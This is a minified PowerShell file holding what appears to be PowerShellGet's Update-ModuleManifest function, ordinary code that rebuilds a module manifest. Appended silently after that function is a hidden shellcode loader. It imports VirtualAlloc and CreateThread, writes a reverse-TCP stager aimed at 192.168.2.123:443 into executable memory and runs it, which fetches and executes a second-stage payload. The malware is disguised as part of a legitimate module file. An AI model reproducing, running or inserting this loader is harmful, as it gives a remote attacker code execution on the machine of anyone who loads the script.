function Update-ModuleManifest{[CmdletBinding(SupportsShouldProcess=$true,PositionalBinding=$false,HelpUri='https://go.microsoft.com/fwlink/?LinkId=619311')]Param([Parameter(Mandatory=$true,Position=0,ValueFromPipelineByPropertyName=$true)][ValidateNotNullOrEmpty()][string]$Path,[ValidateNotNullOrEmpty()][Object[]]$NestedModules,[ValidateNotNullOrEmpty()][Guid]$Guid,[Parameter()][ValidateNotNullOrEmpty()][string]$Author,[Parameter()][ValidateNotNullOrEmpty()][String]$CompanyName,[Parameter()][ValidateNotNullOrEmpty()][string]$Copyright,[Parameter()][ValidateNotNullOrEmpty()][string]$RootModule,[Parameter()][ValidateNotNullOrEmpty()][Version]$ModuleVersion,[Parameter()][ValidateNotNullOrEmpty()][string]$Description,[Parameter()][ValidateNotNullOrEmpty()][System.Reflection.ProcessorArchitecture]$ProcessorArchitecture,[Parameter()][ValidateSet('Desktop','Core')][string[]]$CompatiblePSEditions,[Parameter()][ValidateNotNullOrEmpty()][Version]$PowerShellVersion,[Parameter()][ValidateNotNullOrEmpty()][Version]$ClrVersion,[Parameter()][ValidateNotNullOrEmpty()][Version]$DotNetFrameworkVersion,[Parameter()][ValidateNotNullOrEmpty()][String]$PowerShellHostName,[Parameter()][ValidateNotNullOrEmpty()][Version]$PowerShellHostVersion,[Parameter()][ValidateNotNullOrEmpty()][Object[]]$RequiredModules,[Parameter()][ValidateNotNullOrEmpty()][string[]]$TypesToProcess,[Parameter()][ValidateNotNullOrEmpty()][string[]]$FormatsToProcess,[Parameter()][ValidateNotNullOrEmpty()][string[]]$ScriptsToProcess,[Parameter()][ValidateNotNullOrEmpty()][string[]]$RequiredAssemblies,[Parameter()][ValidateNotNullOrEmpty()][string[]]$FileList,[Parameter()][ValidateNotNullOrEmpty()][object[]]$ModuleList,[Parameter()][string[]]$FunctionsToExport,[Parameter()][string[]]$AliasesToExport,[Parameter()][ValidateNotNullOrEmpty()][string[]]$VariablesToExport,[Parameter()][string[]]$CmdletsToExport,[Parameter()][ValidateNotNullOrEmpty()][string[]]$DscResourcesToExport,[Parameter()][ValidateNotNullOrEmpty()][System.Collections.Hashtable]$PrivateData,[Parameter()][ValidateNotNullOrEmpty()][string[]]$Tags,[Parameter()][ValidateNotNullOrEmpty()][Uri]$ProjectUri,[Parameter()][ValidateNotNullOrEmpty()][Uri]$LicenseUri,[Parameter()][ValidateNotNullOrEmpty()][Uri]$IconUri,[Parameter()][string[]]$ReleaseNotes,[Parameter()][string]$Prerelease,[Parameter()][ValidateNotNullOrEmpty()][Uri]$HelpInfoUri,[Parameter()][switch]$PassThru,[Parameter()][ValidateNotNullOrEmpty()][String]$DefaultCommandPrefix,[Parameter()][ValidateNotNullOrEmpty()][String[]]$ExternalModuleDependencies,[Parameter()][ValidateNotNullOrEmpty()][String[]]$PackageManagementProviders,[Parameter()][switch]$RequireLicenseAcceptance)if(-not (Microsoft.PowerShell.Management\Test-Path -Path $Path -PathType Leaf)){$message = $LocalizedData.UpdateModuleManifestPathCannotFound -f ($Path)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "InvalidModuleManifestFilePath" `-ExceptionObject $Path `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument}$ModuleManifestHashTable = $nulltry{$ModuleManifestHashTable = Get-ManifestHashTable -Path $Path -CallerPSCmdlet $PSCmdlet}catch{$message = $LocalizedData.TestModuleManifestFail -f ($_.Exception.Message)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "InvalidModuleManifestFile" `-ExceptionObject $Path `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}$moduleInfo = $nulltry{$moduleInfo = Microsoft.PowerShell.Core\Test-ModuleManifest -Path $Path -ErrorAction Stop}catch{if(-not $moduleInfo){$message = $LocalizedData.TestModuleManifestFail -f ($_.Exception.Message)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "InvalidModuleManifestFile" `-ExceptionObject $Path `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}}$params = @{}if($NestedModules){$params.Add("NestedModules",$NestedModules)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("NestedModules")){$params.Add("NestedModules",$ModuleManifestHashtable.NestedModules)}if($Guid){$params.Add("Guid",$Guid)}elseif($moduleInfo.Guid){$params.Add("Guid",$moduleInfo.Guid)}if($Author){$params.Add("Author",$Author)}elseif($moduleInfo.Author){$params.Add("Author",$moduleInfo.Author)}if($CompanyName){$params.Add("CompanyName",$CompanyName)}elseif($moduleInfo.CompanyName){$params.Add("CompanyName",$moduleInfo.CompanyName)} else  {$params.Add("CompanyName", '__UPDATEDCOMPANYNAMETOBEREPLACEDINFUNCTION__')}if($Copyright){$params.Add("CopyRight",$Copyright)}elseif($moduleInfo.Copyright){$params.Add("Copyright",$moduleInfo.Copyright)}if($RootModule){$params.Add("RootModule",$RootModule)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("RootModule") -and $moduleInfo.RootModule){$params.Add("RootModule",$ModuleManifestHashTable.RootModule)}if($ModuleVersion){$params.Add("ModuleVersion",$ModuleVersion)}elseif($moduleInfo.Version){$params.Add("ModuleVersion",$moduleInfo.Version)}if($Description){$params.Add("Description",$Description)}elseif($moduleInfo.Description){$params.Add("Description",$moduleInfo.Description)}if($ProcessorArchitecture){$params.Add("ProcessorArchitecture",$ProcessorArchitecture)}elseif($moduleInfo.ProcessorArchitecture -and $moduleInfo.ProcessorArchitecture -ne 'None'){$params.Add("ProcessorArchitecture",$moduleInfo.ProcessorArchitecture)}if($PowerShellVersion){$params.Add("PowerShellVersion",$PowerShellVersion)}elseif($moduleinfo.PowerShellVersion){$params.Add("PowerShellVersion",$moduleinfo.PowerShellVersion)}if($ClrVersion){$params.Add("ClrVersion",$ClrVersion)}elseif($moduleInfo.ClrVersion){$params.Add("ClrVersion",$moduleInfo.ClrVersion)}if($DotNetFrameworkVersion){$params.Add("DotNetFrameworkVersion",$DotNetFrameworkVersion)}elseif($moduleInfo.DotNetFrameworkVersion){$params.Add("DotNetFrameworkVersion",$moduleInfo.DotNetFrameworkVersion)}if($PowerShellHostName){$params.Add("PowerShellHostName",$PowerShellHostName)}elseif($moduleInfo.PowerShellHostName){$params.Add("PowerShellHostName",$moduleInfo.PowerShellHostName)}if($PowerShellHostVersion){$params.Add("PowerShellHostVersion",$PowerShellHostVersion)}elseif($moduleInfo.PowerShellHostVersion){$params.Add("PowerShellHostVersion",$moduleInfo.PowerShellHostVersion)}if($RequiredModules){$params.Add("RequiredModules",$RequiredModules)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("RequiredModules") -and $moduleInfo.RequiredModules){$params.Add("RequiredModules",$ModuleManifestHashtable.RequiredModules)}if($TypesToProcess){$params.Add("TypesToProcess",$TypesToProcess)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("TypesToProcess") -and $moduleInfo.ExportedTypeFiles){$params.Add("TypesToProcess",$ModuleManifestHashTable.TypesToProcess)}if($FormatsToProcess){$params.Add("FormatsToProcess",$FormatsToProcess)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("FormatsToProcess") -and $moduleInfo.ExportedFormatFiles){$params.Add("FormatsToProcess",$ModuleManifestHashTable.FormatsToProcess)}if($ScriptsToProcess){$params.Add("ScriptsToProcess",$ScriptstoProcess)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("ScriptsToProcess") -and $moduleInfo.Scripts){$params.Add("ScriptsToProcess",$ModuleManifestHashTable.ScriptsToProcess)}if($RequiredAssemblies){$params.Add("RequiredAssemblies",$RequiredAssemblies)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("RequiredAssemblies") -and $moduleInfo.RequiredAssemblies){$params.Add("RequiredAssemblies",$moduleInfo.RequiredAssemblies)}if($FileList){$params.Add("FileList",$FileList)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("FileList") -and $moduleInfo.FileList){$params.Add("FileList",$ModuleManifestHashTable.FileList)}$moduleBase = $moduleInfo.ModuleBaseforeach($file in $params["FileList"]){if(-not [System.IO.Path]::IsPathRooted($file)){$combinedPath = Join-Path $moduleBase -ChildPath $file}else{$combinedPath = $file}if(-not (Microsoft.PowerShell.Management\Test-Path -Type Leaf -LiteralPath $combinedPath)){$message = $LocalizedData.FilePathInFileListNotWithinModuleBase -f ($file,$moduleBase)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "FilePathInFileListNotWithinModuleBase" `-ExceptionObject $file `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}}if($ModuleList){$params.Add("ModuleList",$ModuleList)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("ModuleList") -and $moduleInfo.ModuleList){$params.Add("ModuleList",$ModuleManifestHashtable.ModuleList)}if($FunctionsToExport -or $FunctionsToExport -is [array]){$params.Add("FunctionsToExport",$FunctionsToExport)}elseif($moduleInfo.ExportedFunctions){if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("FunctionsToExport") -and $ModuleManifestHashTable['FunctionsToExport'] -eq '*' `-and $moduleInfo.ExportedFunctions.Keys.Count -eq 0){$params.Add("FunctionsToExport", $ModuleManifestHashTable['FunctionsToExport'])}elseif($moduleInfo.Prefix){$originalFunctions = $moduleInfo.ExportedFunctions.Keys | foreach-object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }$params.Add("FunctionsToExport", $originalFunctions)}else {$params.Add("FunctionsToExport",($moduleInfo.ExportedFunctions.Keys -split ' '))}}elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("FunctionsToExport")){$params.Add("FunctionsToExport", $ModuleManifestHashTable['FunctionsToExport'])}if($AliasesToExport -or $AliasesToExport -is [array]){$params.Add("AliasesToExport",$AliasesToExport)}elseif($moduleInfo.ExportedAliases){if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("AliasesToExport") -and $ModuleManifestHashTable['AliasesToExport'] -eq '*' `-and $moduleInfo.ExportedAliases.Keys.Count -eq 0){$params.Add("AliasesToExport", $ModuleManifestHashTable['AliasesToExport'])}elseif($moduleInfo.Prefix){$originalAliases = $moduleInfo.ExportedAliases.Keys | ForEach-Object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }$params.Add("AliasesToExport", $originalAliases)   }else {$params.Add("AliasesToExport",($moduleInfo.ExportedAliases.Keys -split ' '))}}elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("AliasesToExport")){$params.Add("AliasesToExport", $ModuleManifestHashTable['AliasesToExport'])}if($VariablesToExport){$params.Add("VariablesToExport",$VariablesToExport)}elseif($moduleInfo.ExportedVariables){if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("VariablesToExport") -and $ModuleManifestHashTable['VariablesToExport'] -eq '*' `-and $moduleInfo.ExportedVariables.Keys.Count -eq 0){$params.Add("VariablesToExport", $ModuleManifestHashTable['VariablesToExport'])}else {$params.Add("VariablesToExport",($moduleInfo.ExportedVariables.Keys -split ' '))}}if($CmdletsToExport -or $CmdletsToExport -is [array]){$params.Add("CmdletsToExport", $CmdletsToExport)}elseif($moduleInfo.ExportedCmdlets){if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("CmdletsToExport") -and $ModuleManifestHashTable['CmdletsToExport'] -eq '*' `-and $moduleInfo.ExportedCmdlets.Count -eq 0){$params.Add("CmdletsToExport", $ModuleManifestHashTable['CmdletsToExport'])}elseif($moduleInfo.Prefix){$originalCmdlets = $moduleInfo.ExportedCmdlets.Keys | ForEach-Object { $parts = $_ -split '-', 2; $parts[-1] = $parts[-1] -replace "^$($moduleInfo.Prefix)"; $parts -join '-' }$params.Add("CmdletsToExport", $originalCmdlets)}else{$params.Add("CmdletsToExport",($moduleInfo.ExportedCmdlets.Keys -split ' '))}}elseif ($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("CmdletsToExport")){$params.Add("CmdletsToExport", $ModuleManifestHashTable['CmdletsToExport'])}if($DscResourcesToExport){if  (($PSVersionTable.PSVersion -lt '5.0.0') -or ($PowerShellVersion -and $PowerShellVersion -lt '5.0') `-or (-not $PowerShellVersion -and $moduleInfo.PowerShellVersion -and $moduleInfo.PowerShellVersion -lt '5.0') `-or (-not $PowerShellVersion -and -not $moduleInfo.PowerShellVersion)){ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $LocalizedData.ExportedDscResourcesNotSupportedOnLowerPowerShellVersion `-ErrorId "ExportedDscResourcesNotSupported" `-ExceptionObject $DscResourcesToExport `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}$params.Add("DscResourcesToExport",$DscResourcesToExport)}elseif(Microsoft.PowerShell.Utility\Get-Member -InputObject $moduleInfo -name "ExportedDscResources"){if($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("DscResourcesToExport") -and $ModuleManifestHashTable['DscResourcesToExport'] -eq '*' `-and $moduleInfo.ExportedDscResources.Count -eq 0){$params.Add("DscResourcesToExport", $ModuleManifestHashTable['DscResourcesToExport']) }else {$params.Add("DscResourcesToExport", $moduleInfo.ExportedDscResources)}}if($CompatiblePSEditions){if  (($PSVersionTable.PSVersion -lt '5.1.0') -or ($PowerShellVersion -and $PowerShellVersion -lt '5.1') `-or (-not $PowerShellVersion -and $moduleInfo.PowerShellVersion -and $moduleInfo.PowerShellVersion -lt '5.1') `-or (-not $PowerShellVersion -and -not $moduleInfo.PowerShellVersion)){ThrowError -ExceptionName 'System.ArgumentException' `-ExceptionMessage $LocalizedData.CompatiblePSEditionsNotSupportedOnLowerPowerShellVersion `-ErrorId 'CompatiblePSEditionsNotSupported' `-ExceptionObject $CompatiblePSEditions `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}$params.Add('CompatiblePSEditions', $CompatiblePSEditions)}elseif( (Microsoft.PowerShell.Utility\Get-Member -InputObject $moduleInfo -name 'CompatiblePSEditions') -and$moduleInfo.CompatiblePSEditions){$params.Add('CompatiblePSEditions', $moduleInfo.CompatiblePSEditions)}if($HelpInfoUri){$params.Add("HelpInfoUri",$HelpInfoUri)}elseif($moduleInfo.HelpInfoUri){$params.Add("HelpInfoUri",$moduleInfo.HelpInfoUri)}if($DefaultCommandPrefix){$params.Add("DefaultCommandPrefix",$DefaultCommandPrefix)}elseif($ModuleManifestHashTable -and $ModuleManifestHashTable.ContainsKey("DefaultCommandPrefix") -and $ModuleManifestHashTable.DefaultCommandPrefix){$params.Add("DefaultCommandPrefix",$ModuleManifestHashTable.DefaultCommandPrefix)}$tempPath = Microsoft.PowerShell.Management\Join-Path -Path $moduleInfo.ModuleBase -ChildPath "PSGet_$($moduleInfo.Name).psd1"$params.Add("Path",$tempPath)try{try{Microsoft.PowerShell.Core\New-ModuleManifest @params -Confirm:$false -WhatIf:$false(Get-Content -Path $tempPath) | ForEach-Object {$_ -Replace '__UPDATEDCOMPANYNAMETOBEREPLACEDINFUNCTION__', ''} | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false}catch{$ErrorMessage = $LocalizedData.UpdatedModuleManifestNotValid -f ($Path, $_.Exception.Message)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $ErrorMessage `-ErrorId "NewModuleManifestFailure" `-ExceptionObject $params `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}$PrivateDataInput = ""$ExistingData = $moduleInfo.PrivateData$Data = @{}if($ExistingData){foreach($key in $ExistingData.Keys){if($key -ne "PSData"){$Data.Add($key,$ExistingData[$key])}else{$PSData = $ExistingData["PSData"]foreach($entry in $PSData.Keys){$Data.Add($entry,$PSData[$Entry])}}}}if($PrivateData){foreach($key in $PrivateData.Keys){if($key -ne "PSData"){$Data[$key] = $PrivateData[$Key]}else{$PSData = $ExistingData["PSData"]foreach($entry in $PSData.Keys){$Data[$entry] = $PSData[$entry]}}}}if($Tags){$Data["Tags"] = $Tags}if($ProjectUri){$Data["ProjectUri"] = $ProjectUri}if($LicenseUri){$Data["LicenseUri"] = $LicenseUri}if($IconUri){$Data["IconUri"] = $IconUri}if($RequireLicenseAcceptance){$Data["RequireLicenseAcceptance"] = $RequireLicenseAcceptance}if($ReleaseNotes){$Data["ReleaseNotes"] = $($ReleaseNotes -join "`r`n")}if ($Prerelease){$result = ValidateAndGet-VersionPrereleaseStrings -Version $params["ModuleVersion"] -Prerelease $Prerelease -CallerPSCmdlet $PSCmdletif (-not $result){return}$validatedPrerelease = $result["Prerelease"]$Data[$script:Prerelease] = $validatedPrerelease}if($ExternalModuleDependencies){$DependentModuleNames = @()foreach($moduleInfo in $params["NestedModules"]){if($moduleInfo.GetType() -eq [System.Collections.Hashtable]){$DependentModuleNames += $moduleInfo.ModuleName}}foreach($moduleInfo in $params["RequiredModules"]){if($moduleInfo.GetType() -eq [System.Collections.Hashtable]){$DependentModuleNames += $moduleInfo.ModuleName}}foreach($dependency in $ExternalModuleDependencies){if($params["NestedModules"] -notcontains $dependency -and$params["RequiredModules"] -notContains $dependency -and$DependentModuleNames -notcontains $dependency){$message = $LocalizedData.ExternalModuleDependenciesNotSpecifiedInRequiredOrNestedModules -f ($dependency)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "InvalidExternalModuleDependencies" `-ExceptionObject $Exception `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}}if($Data.ContainsKey("ExternalModuleDependencies")){$Data["ExternalModuleDependencies"] = $ExternalModuleDependencies}else{$Data.Add("ExternalModuleDependencies", $ExternalModuleDependencies)}}if($PackageManagementProviders){$ModuleBase = Microsoft.PowerShell.Management\Split-Path $Path -Parent$Files = Microsoft.PowerShell.Management\Get-ChildItem -Path $ModuleBaseforeach($provider in $PackageManagementProviders){if ($Files.Name -notcontains $provider){$message = $LocalizedData.PackageManagementProvidersNotInModuleBaseFolder -f ($provider,$ModuleBase)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "InvalidPackageManagementProviders" `-ExceptionObject $PackageManagementProviders `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}}$Data["PackageManagementProviders"] = $PackageManagementProviders}$PrivateDataInput = Get-PrivateData -PrivateData $Data$PrivateDataBegin = Select-String -Path $tempPath -Pattern "PrivateData ="$PrivateDataBeginLine = $PrivateDataBegin.LineNumber$newManifest = Microsoft.PowerShell.Management\Get-Content -Path $tempPath$PrivateDataEndLine=0if($PrivateDataBegin -match "@{"){$leftBrace = 0$EndLineOfFile = $newManifest.Length-1For($i = $PrivateDataBeginLine;$i -lt $EndLineOfFile; $i++){if($newManifest[$i] -match "{"){$leftBrace ++}elseif($newManifest[$i] -match "}"){if($leftBrace -gt 0){$leftBrace --}else{$PrivateDataEndLine = $ibreak}}}}try{if($PrivateDataEndLine -ne 0){$newManifest  | where {$_.readcount -le $PrivateDataBeginLine -or $_.readcount -gt $PrivateDataEndLine+1} `| ForEach-Object {$_if($_ -match "PrivateData = "){$PrivateDataInput}} | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false}else{$PrivateDataForDownlevelPS = "PrivateData = @{ `n"+$PrivateDataInput$newManifest  | where {$_.readcount -le $PrivateDataBeginLine -or $_.readcount -gt $PrivateDataBeginLine } `| ForEach-Object {$_if($_ -match "PrivateData = "){$PrivateDataForDownlevelPS}} | Set-Content -Path $tempPath -Confirm:$false -WhatIf:$false}$testModuleInfo = Microsoft.PowerShell.Core\Test-ModuleManifest -Path $tempPath `-Verbose:$VerbosePreference ` -ErrorAction Stop}catch{$message = $LocalizedData.UpdatedModuleManifestNotValid -f ($Path, $_.Exception.Message)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "UpdateManifestFileFail" `-ExceptionObject $_.Exception `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgumentreturn}$newContent = Microsoft.PowerShell.Management\Get-Content -Path $tempPath$newContent[1] = $newContent[1] -replace "'PSGet_", "'"try{if($PSCmdlet.ShouldProcess($Path,$LocalizedData.UpdateManifestContentMessage+$newContent)){Microsoft.PowerShell.Management\Set-Content -Path $Path -Value $newContent -Confirm:$false -WhatIf:$false}if($PassThru){return $newContent}}catch{$message = $LocalizedData.ManifestFileReadWritePermissionDenied -f ($Path)ThrowError -ExceptionName "System.ArgumentException" `-ExceptionMessage $message `-ErrorId "ManifestFileReadWritePermissionDenied" `-ExceptionObject $Path `-CallerPSCmdlet $PSCmdlet `-ErrorCategory InvalidArgument}}finally{Microsoft.PowerShell.Management\Remove-Item -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue -WarningAction SilentlyContinue -Confirm:$false -WhatIf:$false}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x02,0x7b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};